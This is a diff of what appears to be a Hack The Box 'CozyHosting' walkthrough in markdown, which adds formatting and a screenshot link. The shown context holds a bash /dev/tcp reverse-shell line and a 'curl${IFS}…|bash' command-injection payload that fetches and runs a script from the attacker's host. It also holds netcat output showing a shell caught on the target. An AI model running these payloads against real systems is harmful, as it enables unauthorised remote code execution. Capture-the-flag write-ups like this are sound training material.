@@ -241,10 +241,29 @@ bash -i >& /dev/tcp/10.10.14.17/443 0>&1
 
 <br />
 
-Now that we have the file, we run a curl again but poiting to the shell.sh and interpreting it with bash:
+Now that we have the `file`, we run a `curl` again but `poiting` to the `shell.sh` and `interpreting` it with `bash`:
 
 - Payload -> `curl${IFS}10.10.14.17|bash`
 
 <br />
 
+![13](../../../assets/images/CozyHosting/13.png)
 
+<br />
+
+Check the `listener` and... YES!
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.11.230] 35018
+bash: cannot set terminal process group (1061): Inappropriate ioctl for device
+bash: no job control in this shell
+app@cozyhosting:/app$ id
+id
+uid=1001(app) gid=1001(app) groups=1001(app)
+```
+
+<br />
